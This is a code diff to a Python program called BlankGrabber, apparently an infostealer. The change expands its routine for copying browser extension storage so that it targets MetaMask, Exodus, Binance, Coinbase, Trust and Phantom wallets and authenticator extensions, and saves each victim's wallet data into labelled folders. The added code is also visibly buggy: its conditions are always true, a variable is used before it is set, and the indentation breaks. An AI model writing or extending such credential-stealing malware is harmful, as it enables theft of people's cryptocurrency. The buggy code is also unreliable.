@@ -1241,11 +1241,24 @@ class BlankGrabber:
                             for _dir in dirs:
                                 if _dir == "Local Extension Settings":
                                     localExtensionsSettingsDir = os.path.join(root, _dir)
-                                    for _dir in ("ejbalbakoplchlghecdalmeeeajnimhm", "nkbihfbeogaeaoehlefnkodbefgpgknn"):
-                                        extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
-                                        if os.path.isdir(extentionPath) and os.listdir(extentionPath):
-                                            try:
-                                                metamask_browser = os.path.join(saveToDir, "Metamask ({})".format(name))
+                        for _dir in ("ejbalbakoplchlghecdalmeeeajnimhm", "nkbihfbeogaeaoehlefnkodbefgpgknn", "aholpfdialjgjfhomihkjbmgjidlcdno", "fhbohimaelbohpjbbldcngcnapndodjp","hnfanknocfeofbddgcijnmhnfnkdnaad","egjidjbpglichdcondbcbdnbeeppgdph","bfnaelmomeimhlpmgjnjophhpkkoljpa","ocglkepbibnalbgmbachknglpdipeoio","bhghoamapcdpbohphigoooaddinpkbai"):
+                            extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
+                            if os.path.isdir(extentionPath) and os.listdir(extentionPath):
+                                try:
+                                    if _dir == "ejbalbakoplchlghecdalmeeeajnimhm" or "nkbihfbeogaeaoehlefnkodbefgpgknn":
+                                        metamask_browser = os.path.join(_saveToDir, f"Metamask ({name})")
+                                    elif _dir == "aholpfdialjgjfhomihkjbmgjidlcdno":
+                                        metamask_browser = os.path.join(_saveToDir, f"Exodus ({name})")
+                                    elif _dir == "fhbohimaelbohpjbbldcngcnapndodjp":
+                                        metamask_browser = os.path.join(_saveToDir, f"Binance ({name})")
+                                    elif _dir == "hnfanknocfeofbddgcijnmhnfnkdnaad":
+                                        metamask_browser = os.path.join(_saveToDir, f"Coinbase ({name})")
+                                    elif _dir == "egjidjbpglichdcondbcbdnbeeppgdph":
+                                        metamask_browser = os.path.join(_saveToDir, f"Trust ({name})")
+                                    elif _dir == "bfnaelmomeimhlpmgjnjophhpkkoljpa":
+                                        metamask_browser = os.path.join(_saveToDir, f"Phantom ({name})")
+                                    elif _dir == "ocglkepbibnalbgmbachknglpdipeoio" or "bhghoamapcdpbohphigoooaddinpkbai":
+                                        metamask_browser = os.path.join(goodiespath, f"Authentication ({name})")
                                                 _saveToDir =  os.path.join(metamask_browser, _dir)
                                                 shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok= True)
                                                 with open(os.path.join(_saveToDir, "Location.txt"), "w") as file:
